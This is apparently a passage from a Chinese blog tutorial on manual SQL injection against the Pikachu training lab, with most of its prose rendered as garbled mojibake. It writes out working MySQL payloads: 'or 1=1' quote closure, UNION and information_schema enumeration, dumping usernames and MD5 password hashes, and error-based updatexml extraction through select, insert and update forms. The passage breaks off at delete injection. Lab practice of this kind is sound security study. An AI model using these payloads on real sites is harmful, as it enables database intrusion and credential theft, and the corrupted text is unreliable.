ä¸xsså·®ä¸å¤šæˆ‘ä»¬è¦æ„æˆä¸€ä¸ªåˆæ³•é—­åˆã€‚å­—ç¬¦ä¸²éœ€è¦åŠ å•å¼•å·æ‰åˆæ³•ã€‚æˆ‘ä»¬éœ€è¦æŠŠå‰åä¸¤ä¸ªå•å¼•å·æ³¨é‡Šæ‰ã€‚è¾“å…¥`kobe' or 1=1#`ç¬¬ä¸€ä¸ªå•å¼•å·ä¼šå°†å‰é¢çš„å•å¼•å·é—­åˆï¼Œåé¢çš„#å·ä¼šæ³¨é‡Šæ‰åé¢çš„å•å¼•å·ã€‚æˆ‘ä»¬å°è¯•æäº¤ã€‚-
![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2Ff5d9d321338e468b9833db0b30fa1662.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_d3F5LXplbmhlaQ%2Cshadow_50%2Ctext_Q1NETiBAd3lkMjAwMQ%3D%3D%2Csize_12%2Ccolor_FFFFFF%2Ct_70%2Cg_se%2Cx_16)-
ç»“æœä¼šå°†æ•°æ®åº“è¡¨ä¸­çš„ä¸œè¥¿éå†å‡ºæ¥ã€‚-
**æœç´¢å‹æ³¨å…¥**-
è¾“å…¥å­—ç¬¦kï¼Œç‚¹å‡»æäº¤ï¼Œè§‚å¯Ÿç»“æœã€‚-
![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F3df82c635bc54efdb19dbc0a2d85fa6f.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_d3F5LXplbmhlaQ%2Cshadow_50%2Ctext_Q1NETiBAd3lkMjAwMQ%3D%3D%2Csize_14%2Ccolor_FFFFFF%2Ct_70%2Cg_se%2Cx_16)-
è¿”å›äº†æ‰€æœ‰å«æœ‰kçš„ç”¨æˆ·ã€‚

    select from è¡¨å where username like ' %k% ';
    
        

è¿™ç§æŸ¥è¯¢æ¯”getå¤šäº†%å·ï¼Œæˆ‘ä»¬è¦æƒ³åŠæ³•æ„é€ ä¸€ä¸ªåˆæ³•çš„é—­åˆã€‚

    select from è¡¨å where username like ' %666%'or 1=1 #% ';
    
        

æˆ‘ä»¬è¾“å…¥å­—ç¬¦æŸ¥çœ‹ç»“æœã€‚-
![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2Ff6f8a6c03e3e4053801c30358b16834c.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_d3F5LXplbmhlaQ%2Cshadow_50%2Ctext_Q1NETiBAd3lkMjAwMQ%3D%3D%2Csize_14%2Ccolor_FFFFFF%2Ct_70%2Cg_se%2Cx_16)-
åªè¦ç†è§£ï¼ŒçŒœæµ‹åå°å¦‚ä½•æ‹¼æ¥ï¼Œè®¾ç½®åˆæ³•çš„payloadï¼Œæ„é€ é—­åˆã€‚-
**xxå‹æ³¨å…¥**-
æŸ¥çœ‹åç«¯ä»£ç ï¼Œå¤šé™¤äº†æ‹¬å·ï¼Œæˆ‘ä»¬è¿˜æ˜¯è¿›è¡Œé—­åˆã€‚-
è¾“å…¥xxâ€™) or 1=1 # ï¼ŒæŸ¥çœ‹ç»“æœã€‚-
![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F55b3af0fd4504ddf956c062c7ab6ff22.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_d3F5LXplbmhlaQ%2Cshadow_50%2Ctext_Q1NETiBAd3lkMjAwMQ%3D%3D%2Csize_11%2Ccolor_FFFFFF%2Ct_70%2Cg_se%2Cx_16)-
æ‰€ä»¥è¯´åªè¦æ„é€ é—­åˆæˆåŠŸå°±å¯ä»¥äº†ã€‚-
![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F67638f301fe84d5c8a0d413a2c100732.png)

#### 3.4.3SQL Injectæ¼æ´æ‰‹å·¥æµ‹è¯•:åŸºäºunionè”åˆæŸ¥è¯¢çš„ä¿¡æ¯è·å–( select )

unionè”åˆæŸ¥è¯¢:å¯ä»¥é€šè¿‡è”åˆæŸ¥è¯¢æ¥æŸ¥è¯¢æŒ‡å®šçš„æ•°æ®-
ç”¨æ³•ä¸¾ä¾‹:-
select username,password from user where id=1 union select å­—æ®µ1 ,å­—æ®µ2 from è¡¨å-
è”åˆæŸ¥è¯¢çš„å­—æ®µæ•°éœ€è¦å’Œä¸»æŸ¥è¯¢ä¸€è‡´!-
æ‰“å¼€å­—ç¬¦å‹æ³¨å…¥ï¼Œè¾“å…¥aâ€™ order by 5#ã€‚-
![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2Ff93621f100a0470a8210f1b7bb8ebf62.png)-
è¯´æ˜ç¬¬äº”åˆ—ä¸å­˜åœ¨ã€‚è¿™ä¸ªæ—¶å€™æˆ‘ä»¬è¯•ä¸€ä¸‹3ã€‚-
![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2Fbccb884bd616418da894682ce29e0068.png)-
è¯´æ˜ç¬¬ä¸‰åˆ—ä¹Ÿä¸å­˜åœ¨ã€‚æˆ‘ä»¬å†æ¢æˆ2ã€‚-
![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2Fd2f72a923109461995703172e0db5430.png)-
æ­£å¸¸æŠ¥é”™ï¼Œæ„å‘³ç€ä¸»æŸ¥è¯¢é‡Œåªæœ‰ä¸¤ä¸ªå­—æ®µã€‚ç¡®è®¤å­—æ®µåï¼Œæ„å»ºunionã€‚

    a' union select database(),uesr()#
    
        

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F0090519aa4b2429b99ec9ff3d8c6fd66.png)-
è¿™ä¸ªæ—¶å€™å°±ä¼šæŠŠæ•°æ®åº“åç§°ï¼Œå½“å‰ç”¨æˆ·ï¼Œå½“å‰ç”¨æˆ·æƒé™æ˜¾ç¤ºå‡ºæ¥ã€‚-
æˆ‘ä»¬è¿˜å¯ä»¥æŸ¥ä»–çš„ç‰ˆæœ¬ã€‚

    a' union select version(),4#
    
        

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2Fcd1d59174d9f468f81fd5d431a55890e.png)-
è¿™é‡Œç‰ˆæœ¬å·å’Œæ•°å­—å››å°±è¢«æ‰“å°è¾“å‡ºæ¥äº†ã€‚-
è¿˜å¯ä»¥æŸ¥å…¶ä»–ä¸œè¥¿ï¼Œè‡ªå·±å‘æŒ¥äº†ã€‚ä»¥ä¸‹ä»…ä¾›å‚è€ƒã€‚

> Select version(); //å–çš„æ•°æ®åº“ç‰ˆæœ¬-
> Select database(); //å–å¾—å½“å‰çš„æ•°æ®åº“-
> Select user(); //å–å¾—å½“å‰ç™»å½•çš„ç”¨æˆ·-
> order by X //å¯¹æŸ¥è¯¢çš„ç»“æœè¿›è¡Œæ’åº,æŒ‰ç…§ç¬¬Xåˆ—è¿›è¡Œæ’åºï¼Œé»˜è®¤æ•°å­—0-9 ,å­—æ¯a-z-
> æ€è·¯:å¯¹æŸ¥è¯¢çš„ç»“æœä½¿ç”¨order byæŒ‰ç…§æŒ‡å®šçš„åˆ—è¿›è¡Œæ’åº,å¦‚æœæŒ‡å®šçš„åˆ—ä¸å­˜åœ¨,æ•°æ®åº“ä¼šæŠ¥é”™ã€‚é€šè¿‡æŠ¥é”™åˆ¤æ–­æŸ¥è¯¢ç»“æœçš„åˆ—æ•°,ä»è€Œç¡®å®šä¸»æŸ¥è¯¢çš„å­—æ®µæ•°ã€‚

#### 3.4.4é€šè¿‡information\_ schemaæ‹¿ä¸‹æ•°æ®åº“æ‰‹å·¥æµ‹è¯•å®Œæ•´æ¡ˆä¾‹æ¼”ç¤º

> **MYSQLå°çŸ¥è¯†è¡¥å……: information\_ schema**-
> åœ¨mysq|ä¸­,è‡ªå¸¦çš„information\_schemaè¿™ä¸ªè¡¨é‡Œé¢å­˜æ”¾äº†å¤§é‡çš„é‡è¦ä¿¡æ¯ã€‚å…·ä½“å¦‚ä¸‹:-
> å¦‚æœå­˜åœ¨æ³¨å…¥ç‚¹çš„è¯ï¼Œå¯ä»¥ç›´æ¥å°è¯•å¯¹è¯¥æ•°æ®åº“è¿›è¡Œè®¿é—®ï¼Œä»è€Œè·å–æ›´å¤šçš„ä¿¡æ¯ã€‚-
> æ¯”å¦‚:-
> SCHEMATAè¡¨:æä¾›äº†å½“å‰mysq|å®ä¾‹ä¸­æ‰€æœ‰æ•°æ®åº“çš„ä¿¡æ¯ã€‚æ˜¯show databasesçš„ç»“æœå–ä¹‹æ­¤è¡¨ã€‚-
> TABLESè¡¨:æä¾›äº†å…³äºæ•°æ®åº“ä¸­çš„è¡¨çš„ä¿¡æ¯(åŒ…æ‹¬è§†å›¾)ã€‚è¯¦ç»†è¡¨è¿°äº†æŸä¸ªè¡¨å±äºå“ªä¸ªschema ,è¡¨ç±»å‹,è¡¨å¼•æ“,åˆ›å»ºæ—¶é—´ç­‰ä¿¡æ¯ã€‚æ˜¯show tables from schemanameçš„ç»“æœå–ä¹‹æ­¤è¡¨ã€‚-
> COLUMNSè¡¨:æä¾›äº†è¡¨ä¸­çš„åˆ—ä¿¡æ¯ã€‚è¯¦ç»†è¡¨è¿°äº†æŸå¼ è¡¨çš„æ‰€æœ‰åˆ—ä»¥åŠæ¯ä¸ªåˆ—çš„ä¿¡æ¯ã€‚æ˜¯show columns from schemaname.tablenameçš„ç»“æœå–ä¹‹æ­¤è¡¨ã€‚

ä»¥å­—ç¬¦å‹ä¸ºæ —å­ï¼Œæˆ‘ä»¬ç«™åœ¨æµ‹è¯•è€…çš„è§’åº¦åˆ¤æ–­æ˜¯å¦å­˜åœ¨SQLæ³¨å…¥æ¼æ´ï¼Œä»¥åŠå¦‚ä½•è·å–æ•°æ®ã€‚-
æˆ‘ä»¬å…ˆè¾“å…¥ä¸€ä¸ªå•å¼•å·è¿›è¡Œæµ‹è¯•ã€‚æäº¤å‘ç°å‡ºç°æŠ¥é”™ã€‚![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2Fd8bd9d0e31ab49c6b47f8d3593bc1e30.png)-
åœ¨å•å¼•å·å¤„å‡ºç°äº†è¯­æ³•é”™è¯¯ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±ä¼šçŸ¥é“æˆ‘ä»¬è¾“å…¥çš„å•å¼•å·å·²ç»è¢«æ‹¼æ¥åˆ°SQLé‡Œé¢äº†ã€‚ä¹Ÿå°±æ„å‘³ç€è¿™é‡Œå­˜åœ¨ç€SQLæ³¨å…¥æ¼æ´ã€‚å®ƒä¼šæŠŠå‰ç«¯è¾“å…¥å½“ä½œæ•°æ®åº“é‡Œçš„ä¸€éƒ¨åˆ†é€»è¾‘å»å¤„ç†ã€‚-
æˆ‘ä»¬çŒœæµ‹æ˜¯å­—ç¬¦å‹çš„ï¼Œå»åšä¸€ä¸ªå°æµ‹è¯•ã€‚-
è¾“å…¥`kobe' or 1=1#`ï¼Œç„¶åç‚¹å‡»æäº¤ã€‚-
![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2Fc1eb830b4b5c4097a5de6e7335c582da.png)-
ç»“æœå‘ç°å¯ä»¥éå†å‡ºæ•°æ®ã€‚ä½†æ˜¯ç°åœ¨çš„ç»“æœå¹¶ä¸èƒ½æ»¡è¶³æˆ‘ä»¬ğŸ˜ˆã€‚æˆ‘ä»¬å¯ä»¥åœ¨è·å–ä¸€ä¸‹å®ƒçš„åŸºç¡€ä¿¡æ¯ã€‚æˆ‘ä»¬ä½¿ç”¨è”åˆæŸ¥è¯¢ï¼Œåœ¨è”åˆæŸ¥è¯¢ä¹‹å‰æˆ‘ä»¬å…ˆä½¿ç”¨order byï¼Œç¡®å®šæœ‰å¤šå°‘ä¸ªå­—æ®µã€‚è¾“å…¥`kobe' order by 3#`ï¼Œå‡ºç°æŠ¥é”™ã€‚-
![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2Fd1262554a405458bb6f0cda19d29d475.png)-
è¾“å…¥`kobe' order by 2#`-
![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F09d92ad7a166414fba1f84337db9b541.png)-
æˆåŠŸæŸ¥è¯¢å‡ºæ¥äº†ï¼Œæˆ‘ä»¬å¯ä»¥ç¡®å®šè¿™é‡Œä¸»æŸ¥è¯¢æœ‰ä¸¤ä¸ªå­—æ®µã€‚ç¡®å®šå­—æ®µä¹‹åæˆ‘ä»¬å°±å¯ä»¥åšè”åˆæŸ¥è¯¢ã€‚æƒ³è¦è·å–information\_ schemaä¸­çš„æ•°æ®ï¼Œè‡³å°‘è¦çŸ¥é“æ•°æ®åº“åç§°ã€‚

    kobe' union select database(),user()#
    
        

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2Fc4196a003ab74164b1191e78e6c076f9.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_d3F5LXplbmhlaQ%2Cshadow_50%2Ctext_Q1NETiBAd3lkMjAwMQ%3D%3D%2Csize_11%2Ccolor_FFFFFF%2Ct_70%2Cg_se%2Cx_16)-
æ•°æ®åº“åç§°ä¸ºpikachuã€‚æ‹¿åˆ°åç§°åæˆ‘ä»¬å°±å¯ä»¥é€šè¿‡information\_ schemaå»è·å–æ•°æ®ã€‚é€šè¿‡unionè”åˆæŸ¥è¯¢ï¼Œç„¶åé€šè¿‡information\_ schemaå»è·å–pikachuä¸€å…±æœ‰å¤šå°‘ä¸ªè¡¨ï¼Œè¡¨çš„åç§°æ˜¯ä»€ä¹ˆã€‚

    kobe' union select table_schema,table_name from information_schema.tables where table_schema='pikachu'#
    
        

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F5eada827805244d8b654233560e93a4a.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_d3F5LXplbmhlaQ%2Cshadow_50%2Ctext_Q1NETiBAd3lkMjAwMQ%3D%3D%2Csize_10%2Ccolor_FFFFFF%2Ct_70%2Cg_se%2Cx_16)-
é™¤äº†æ­£å¸¸çš„æŸ¥è¯¢ï¼Œpikachuæ•°æ®åº“ä¸­æ‰€æœ‰è¡¨çš„åç§°ä¹Ÿè¢«æˆ‘ä»¬çˆ†å‡ºæ¥äº†ã€‚æˆ‘ä»¬è¿›ä¸€æ­¥åˆ†æï¼Œæˆ‘ä»¬å‘ç°æœ‰ä¸€ä¸ªè¡¨åå«åšusersï¼Œæˆ‘ä»¬å¯ä»¥çŒœæµ‹æ˜¯ä¸æ˜¯æ‰€æœ‰çš„ç”¨æˆ·åå¯†ç éƒ½åœ¨å…¶ä¸­ã€‚

    kobe' union select table_name,column_name from information_schema.columns where table_name='users'#
    
        

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F723b727bab1a45d08a31471e3842dba2.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_d3F5LXplbmhlaQ%2Cshadow_50%2Ctext_Q1NETiBAd3lkMjAwMQ%3D%3D%2Csize_11%2Ccolor_FFFFFF%2Ct_70%2Cg_se%2Cx_16)-
æˆ‘ä»¬å¯ä»¥å‘ç°æœ‰è´¦å·å¯†ç ã€‚æ˜¯ä¸æ˜¯æˆ‘ä»¬èƒ½å¤Ÿæ‹¿åˆ°è´¦å·å¯†ç å‘¢ï¼Ÿç°åœ¨å…¶å®å·²ç»å¾ˆç®€å•äº†ã€‚

    kobe' union select username,password from users#
    
        

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2Fc327dc7bf88640c8bc419a2bdf3bb877.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_d3F5LXplbmhlaQ%2Cshadow_50%2Ctext_Q1NETiBAd3lkMjAwMQ%3D%3D%2Csize_15%2Ccolor_FFFFFF%2Ct_70%2Cg_se%2Cx_16)-
è´¦å·å¯†ç å·²ç»åˆ°æ‰‹ï¼Œä½†æ˜¯æˆ‘ä»¬å¯ä»¥çœ‹å‡ºå¯†ç æ˜¯åšè¿‡åŠ å¯†å¤„ç†çš„ï¼Œæ ¹æ®é•¿åº¦æˆ‘ä»¬å¯ä»¥åˆ¤æ–­åº”è¯¥MD5åŠ å¯†ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨ç½‘ä¸Šåšä¸€äº›ç¢°æ’ï¼Œè§£å‡ºæ˜æ–‡ã€‚![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2Fbc18b167c46f4c7eab0d3507ca95de92.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_d3F5LXplbmhlaQ%2Cshadow_50%2Ctext_Q1NETiBAd3lkMjAwMQ%3D%3D%2Csize_20%2Ccolor_FFFFFF%2Ct_70%2Cg_se%2Cx_16)-
è¿™æ˜¯æˆ‘ä»¬çš„ç›®çš„å·²ç»è¾¾æˆäº†ã€‚

#### 3.4.5SQL Injectæ¼æ´æ‰‹å·¥æµ‹è¯•:åŸºäºæŠ¥é”™çš„ä¿¡æ¯è·å–(select/delete/update/insert)

æŠ€å·§æ€è·¯ï¼š-
åœ¨MYSQLä¸­ä½¿ç”¨ä¸€äº›æŒ‡å®šçš„å‡½æ•°æ¥åˆ¶é€ æŠ¥é”™,ä»è€Œä»æŠ¥é”™ä¿¡æ¯ä¸­è·å–è®¾å®šçš„ä¿¡æ¯ã€‚select/insert/update/deleteéƒ½å¯ä»¥ä½¿ç”¨æŠ¥é”™æ¥è·å–ä¿¡æ¯ã€‚-
èƒŒæ™¯æ¡ä»¶ï¼š-
åå°æ²¡æœ‰å±è”½æ•°æ®åº“æŠ¥é”™ä¿¡æ¯ï¼Œåœ¨è¯­æ³•å‘ç”Ÿé”™è¯¯æ—¶ä¼šè¾“å‡ºåœ¨å‰ç«¯ã€‚

> **åŸºäºæŠ¥é”™çš„ä¿¡æ¯è·å–------ä¸‰ä¸ªå¸¸ç”¨çš„ç”¨æ¥æŠ¥é”™çš„å‡½æ•°**-
> updatexml() :å‡½æ•°æ˜¯MYSQLå¯¹XMLæ–‡æ¡£æ•°æ®è¿›è¡ŒæŸ¥è¯¢å’Œä¿®æ”¹çš„XPATHå‡½æ•°ã€‚-
> extractvalue():å‡½æ•°ä¹Ÿæ˜¯MYSQLå¯¹XMLæ–‡æ¡£æ•°æ®è¿›è¡ŒæŸ¥è¯¢çš„XPATHå‡½æ•°ã€‚-
> floor(): MYSQLä¸­ç”¨æ¥å–æ•´çš„å‡½æ•°ã€‚

**updatexml()**-
Updatexm()å‡½æ•°ä½œç”¨: æ”¹å˜(æŸ¥æ‰¾å¹¶æ›¿æ¢) XMLæ–‡æ¡£ä¸­ç¬¦åˆæ¡ä»¶çš„èŠ‚ç‚¹çš„å€¼ã€‚-
è¯­æ³•: UPDATEXML (xml document, XPathstring, new\_value)

> ç¬¬ä¸€ä¸ªå‚æ•°: fiednameæ˜¯Stringæ ¼å¼ï¼Œä¸ºè¡¨ä¸­çš„å­—æ®µåã€‚-
> ç¬¬äºŒä¸ªå‚æ•°: XPathstring (Xpathæ ¼å¼çš„å­—ç¬¦ä¸²)ã€‚-
> ç¬¬ä¸‰ä¸ªå‚æ•°: new. valueï¼ŒStringæ ¼å¼ï¼Œæ›¿æ¢æŸ¥æ‰¾åˆ°çš„ç¬¦åˆæ¡ä»¶çš„

Xpathå®šä½å¿…é¡»æ˜¯æœ‰æ•ˆçš„ï¼Œå¦åˆ™ä¼šå‘ç”Ÿé”™è¯¯ã€‚-
**Selectä¸‹æŠ¥é”™çš„åˆ©ç”¨æ¼”ç¤º**-
æˆ‘ä»¬è¿˜æ˜¯é‚£å­—ç¬¦å‹æ³¨å…¥åšæ¼”ç¤ºï¼Œé¦–å…ˆæˆ‘ä»¬åº”è¯¥åˆ¤æ–­æœ‰æ²¡æœ‰æŠ¥é”™ï¼Œä¼šä¸ä¼šåœ¨å‰ç«¯æ˜¾ç¤ºã€‚æˆ‘ä»¬è¾“å…¥å•å¼•å·ï¼Œå‘ç°æœ‰æ³¨å…¥æŠ¥é”™ã€‚![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F25d37148bf3d460589395f46defadb80.png)-
ç°åœ¨æˆ‘ä»¬æ„é€ ä¸€ä¸ªæŠ¥é”™ã€‚

    kobe' and updatexml(1,version(),0)#
    
        

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F7ceb52075194466e9cd7748f3e8979f3.png)-
.26ä»€ä¹ˆé¬¼ä¸œè¥¿ï¼Œå®ƒå¹¶æ²¡æœ‰æŠŠversionå¯¹åº”çš„ç‰ˆæœ¬å·çˆ†å‡ºæ¥ã€‚ç°åœ¨å¯¹payloadè¿›è¡Œæ”¹é€ ã€‚

    kobe' and updatexml(1,concat(0x7e,version()),0)#
    
        

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F37be29f96db64878838e1e474f04a6af.png)-
æˆ‘ä»¬å·²ç»è·å–åˆ°äº†ç‰ˆæœ¬å·ã€‚ç°åœ¨æˆ‘ä»¬å¯ä»¥æŠŠversionæ›¿æ¢æˆä»»æ„æˆ‘ä»¬æƒ³è¦è·å¾—çš„ä¸œè¥¿ã€‚

    kobe' and updatexml(1,concat(0x7e,database()),0)#
    
        

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2Ffd66a18647c346dabeafc9b0d102e306.png)-
æ•°æ®åº“åç§°å·²ç»è·å–ã€‚æˆ‘ä»¬åœ¨è¿›è¡Œè¿›ä¸€æ­¥æŸ¥è¯¢ã€‚

    kobe' and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema='pikachu')),0)#
    
        

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2Faf6b1e095a254425a3fc5052bed6dc97.png)-
æŠ¥é”™è¿”å›çš„æ•°æ®å¤šä½™ä¸€è¡Œã€‚è¯´æ˜æŠ¥é”™æœ‰å¤šè¡Œã€‚å†æ¬¡è¿›è¡Œå¤„ç†ã€‚å¯ä»¥ä½¿ç”¨limitä¸€æ¬¡ä¸€æ¬¡è¿›è¡Œè·å–è¡¨åã€‚

    kobe' and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema='pikachu' limit 0,1)),0)#
    
        

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F0c3730f2d03d4919b39f58f382052f57.png)-
æˆ‘ä»¬å¯ä»¥å¾—åˆ°ç¬¬ä¸€ä¸ªè¡¨åã€‚æƒ³è¦å¾—åˆ°ç¬¬äºŒä¸ªè¡¨ååªè¦æŠŠ0æ”¹æˆ1å³å¯ã€‚ä¾æ­¤ç±»æ¨ï¼Œå¯ä»¥å¾—åˆ°æ‰€æœ‰è¡¨åã€‚åœ¨è·å–è¡¨åä¹‹åï¼Œæ€è·¯ä¸€æ ·ï¼Œè·å–åˆ—åã€‚

    kobe' and updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_name='users' limit 0,1)),0)#
    
        

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F8dea07491090477ab055e66e4067eacb.png)-
åŒæ ·çš„ä¾æ­¤ç±»æ¨ï¼Œå¾—åˆ°æ‰€æœ‰åˆ—åã€‚åœ¨è·å–åˆ—ååï¼Œå†æ¥è·å–æ•°æ®ã€‚

    kobe' and updatexml(1,concat(0x7e,(select username from users limit 0,1)),0)#
    
        

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F4d68ebb342594f29bd4990c64e8dd53f.png)-
è·å–äº†ç¬¬ä¸€ä¸ªç”¨æˆ·åï¼Œå†æ ¹æ®ç”¨æˆ·åæŸ¥è¯¢å¯†ç ã€‚

    kobe' and updatexml(1,concat(0x7e,(select password from users where username='admin' limit 0,1)),0)#
    
        

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2Fea2bde47e0a24c72a025c8efa98068a8.png)-
è·å–MD5åŠ å¯†çš„å¯†æ–‡ï¼Œè§£å¯†è·å–æ˜æ–‡å¯†ç ã€‚-
**insert/updateæ³¨å…¥**-
æˆ‘ä»¬ç‚¹å‡»æ³¨å†Œ-
![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F09ce3065acf5453d997f45790299bf32.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_d3F5LXplbmhlaQ%2Cshadow_50%2Ctext_Q1NETiBAd3lkMjAwMQ%3D%3D%2Csize_16%2Ccolor_FFFFFF%2Ct_70%2Cg_se%2Cx_16)-
ä¸€æ ·çš„æ–¹æ³•åˆ¤æ–­æ˜¯å¦æœ‰SQLæ³¨å…¥æ¼æ´ï¼Œç»è¿‡åˆ¤æ–­ä¹‹åå‘ç°å­˜åœ¨SQLæ¼æ´ã€‚é‡ç‚¹åœ¨äºæ€ä¹ˆæ„é€ insertçš„payloadã€‚

    ç”¨æˆ·åè¾“å…¥xiaohong' or updatexml(1,concat(0x7e,database()),0) or '
    
        

å¯†ç éšæ„ã€‚ç‚¹å‡»æäº¤ã€‚-
![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F08646f4b9a1a4f8b84d29b811bd2b048.png)-
å¾—åˆ°æ•°æ®åº“åã€‚æ€è·¯ä¸€æ ·æŠŠdatabaseåšæ›¿æ¢ï¼Œå¾—åˆ°æƒ³è¦çš„ä¿¡æ¯ã€‚-
updateä¸insertæ˜¯ä¸€æ¨¡ä¸€æ ·çš„ã€‚æˆ‘ä»¬å…ˆç™»å½•ç”¨æˆ·ã€‚

> åœ¨è¿™é‡Œå¯èƒ½ä¼šæœ‰äººæ˜¾ç¤ºä¸å‡ºæ¥ä¿¡æ¯ï¼Œå¯ä»¥å‚è€ƒè§£å†³æ–¹æ¡ˆã€‚-
> åœ¨ä½¿ç”¨pikachuçš„æ—¶å€™å‘ç°ä¸€ç‚¹é—®é¢˜ï¼Œå¥½åƒæ˜¯ç”±phpç‰ˆæœ¬è¾ƒé«˜å¯¼è‡´çš„ä¸å…¼å®¹ï¼Œå¦‚å›¾ï¼š-
> ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F3dbb44c7315b468ab1c252a2e93ecd9a.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_d3F5LXplbmhlaQ%2Cshadow_50%2Ctext_Q1NETiBAd3lkMjAwMQ%3D%3D%2Csize_20%2Ccolor_FFFFFF%2Ct_70%2Cg_se%2Cx_16)-
> åœ¨è¿™é‡Œæˆ‘ä»¬æ‰“å¼€è¿™ä¸ªè·¯å¾„ï¼Œæ‰¾åˆ°ç¬¬70è¡Œï¼ŒæŠŠMYSQL\_ASSOCæ”¹æˆMYSQLI\_ASSOCï¼Œä¿å­˜æ–‡ä»¶ï¼Œåˆ·æ–°ç½‘é¡µã€‚å°±å¯ä»¥å•¦ã€‚-
> åŸå› ï¼šåœ¨php7ä¸­ï¼ŒMYSQL\_ASSOCä¸å†æ˜¯ä¸€ä¸ªå¸¸é‡ï¼Œå°† MYSQL\_ASSOCæ”¹ä¸ºMYSQLI\_ASSOCï¼Œæ„æ€æ˜¯mysqliçš„æ–¹å¼æå–æ•°ç»„ï¼Œè€Œä¸å†æ˜¯mysql ã€‚ï¼ˆåŸå› ï¼šmysql\_fetch\_arrayhanå‡½æ•°è½¬ä¸ºmysqli\_fetch\_arrayï¼Œå‚æ•°æ²¡æœ‰ä¿®æ”¹ï¼‰

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F8e010a369ab94517ab85d77fafb525bf.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_d3F5LXplbmhlaQ%2Cshadow_50%2Ctext_Q1NETiBAd3lkMjAwMQ%3D%3D%2Csize_20%2Ccolor_FFFFFF%2Ct_70%2Cg_se%2Cx_16)-
è¿™ä¸ªä¿®æ”¹å°±æ˜¯é€šè¿‡updateã€‚è¿™é‡Œå°±å­˜åœ¨updateæ¼æ´ã€‚æˆ‘ä»¬è¾“å…¥åˆšåˆšçš„payloadã€‚-
![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F08646f4b9a1a4f8b84d29b811bd2b048.png)-
çˆ†å‡ºæ•°æ®åº“åç§°ï¼Œä¹‹åé€»è¾‘å°±ä¸€æ ·äº†ã€‚-
**deleteæ³¨å…¥**-
ç‚¹å‡»åˆ é™¤ç•™è¨€ï¼Œç•™è¨€è¢«åˆ é™¤ï¼Œæˆ‘ä»¬æ‰“å¼€burpæŸ¥çœ‹æŠ“åŒ…ã€‚-
